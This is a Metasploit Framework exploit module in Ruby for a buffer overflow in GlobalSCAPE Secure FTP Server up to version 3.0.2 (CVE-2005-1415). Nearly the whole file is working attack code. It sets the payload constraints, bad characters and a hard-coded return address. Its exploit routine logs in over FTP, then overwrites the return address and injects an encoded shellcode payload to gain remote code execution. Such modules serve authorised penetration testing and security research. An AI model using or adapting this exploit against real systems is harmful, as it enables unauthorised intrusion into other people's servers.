##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'GlobalSCAPE Secure FTP Server Input Overflow',
			'Description'    => %q{
				This module exploits a buffer overflow in the GlobalSCAPE Secure FTP Server. 
				All versions prior to 3.0.3 are affected by this flaw. A valid user account (
				or anonymous access) is required for this exploit to work.		
			},
			'Author'         => [ 'Fairuzan Roslan <riaf [at] mysec.org>', 'Mati Aharoni <mati [at] see-security.com>' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2005-1415'],
					[ 'OSVDB', '16049'],
					[ 'BID', '13454'],
					[ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2005-04/0674.html'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00\x20\x61\x62\x63\x64\x65\x66\x67\x68\x69" +
					              "\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74" +
								  "\x75\x76\x77\x78\x79\x7a",
					'PrependEncoder' => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",

				},
			'Targets'        => 
				[
					[
						'GlobalSCAPE Secure FTP Server <= 3.0.2 Universal',
						{
							'Platform' => 'win',
							'Ret'      => 0x1002f01f,
						},
					],
				],
			'DisclosureDate' => 'May 1 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect_login

		buf           = make_nops(3047)
		buf[2043, 4]  = [ target.ret ].pack('V')
		buf[2047, payload.encoded.length] = payload.encoded
		
		send_cmd( [buf] )
		
		handler
		disconnect
	end

end
